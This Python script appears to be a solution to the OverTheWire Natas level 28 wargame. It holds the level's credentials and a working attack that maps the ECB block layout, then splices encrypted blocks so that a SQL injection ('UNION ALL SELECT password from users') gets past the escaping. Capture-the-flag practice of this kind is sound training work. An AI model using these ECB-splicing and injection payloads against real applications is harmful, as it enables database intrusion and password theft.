import binascii
import requests
from requests.auth import HTTPBasicAuth
import string
import base64
from urllib.parse import unquote,quote
from textwrap import wrap

auth = HTTPBasicAuth('natas28', 'skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4')
letters = string.ascii_letters + string.digits
word = ''



def request_with_data(word):
    content = {'Content-Type': 'application/x-www-form-urlencoded'}
    data_query = {'query':word}
    # print(data_query)
    r = requests.post('http://natas28.natas.labs.overthewire.org/index.php', auth=auth, data=data_query, allow_redirects=False, headers=content)
    ecb_encoded = r.headers['Location'].split('=')[1]
    ecb_encoded = unquote(ecb_encoded)
    ecb_encoded = base64.b64decode(ecb_encoded.encode('utf-8'))
    ecb_encoded = ecb_encoded.hex()
    # ecb_encoded = wrap(ecb_encoded,16)
    # ecb_block = ecb_encoded[5:8]
    return ecb_encoded


# for i in range(1,40):
#     word = 'a'*i
#     print(f"{request_with_data(word)} : {i} : {len(request_with_data(word))}")

'''
First we determined the block size, which is 25 - 9 = 16 characters, because at 9 and at 25 the size of response changed, getting increased by a block of 16 .

Then we need to find the offset at which the block starts

We needed to decode them base64 and analyze them like this

So here we find that by putting 8 a's we get a pattern before putting in out actual payload
'''


# request_with_data('A'*10)

# with open('ecb_samples','w') as file:
#     for i in range(1,30):
#         word = 'A'*i
#         r = request_with_data(word)
#         groups = [r[i:i+32] for i in range(0,len(r),32)]
#         for g in groups:
#             file.write(g + ' ')
#         file.write('\n')

'''We test if special chars are escaped by \ or other additional chars are added'''

# with open('ecb_samples_spechial_chars','w') as file:
#     for l in string.whitespace+string.punctuation:
#         word = 'A'*11+l
#         r = request_with_data(word)
#         groups = [r[i:i+32] for i in range(0,len(r),32)]
#         file.write(f'{l} : {len(groups)} : ')
#         for g in groups:
#             file.write(g + ' ')
#         file.write('\n')


''' From the file ecb_samples_special_chars we see that all the characters from this selection give 6 blocks of 16 bytes, which is the equivalent of 13*A's only for these characters: ', ", \
So only these are escaped

'''
# word = 'A'*9+"' UNION ALL SELECT @@version;#"
# r = request_with_data(word)

# groups = [r[i:i+32] for i in range(0,len(r),32)]
# for g in groups:
#     print(g , end=' ')

# word = 'A'*9+"' UNION ALL SELECT password from users;#"
# r = request_with_data(word)

# groups = [r[i:i+32] for i in range(0,len(r),32)]
# for g in groups:
#     print(g , end=' ')

query_with_injection_and_correction = '1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2 5f22a727f625419a466f9af53891f9b2 574d86bbdcff747464514968f43c9240 4645473f530d40f0fd6a481d17ee25b2 c0db24b5274ba212d1b06e990c8db29f 48799a07b1d29b5982015c9355c2e00e aded9bdbaca6a73b71b35a010d2c4c57'
query_with_injection_and_correction = query_with_injection_and_correction.replace(' ','')
print(query_with_injection_and_correction)
query_with_injection_and_correction = bytes.fromhex(query_with_injection_and_correction)
print(query_with_injection_and_correction)
query_with_injection_and_correction = base64.b64encode(query_with_injection_and_correction)
print(query_with_injection_and_correction)
query_with_injection_and_correction = quote(query_with_injection_and_correction)
print(query_with_injection_and_correction)

r = requests.get(f'http://natas28.natas.labs.overthewire.org/search.php/?query={query_with_injection_and_correction}', auth=auth)

print(r.text)


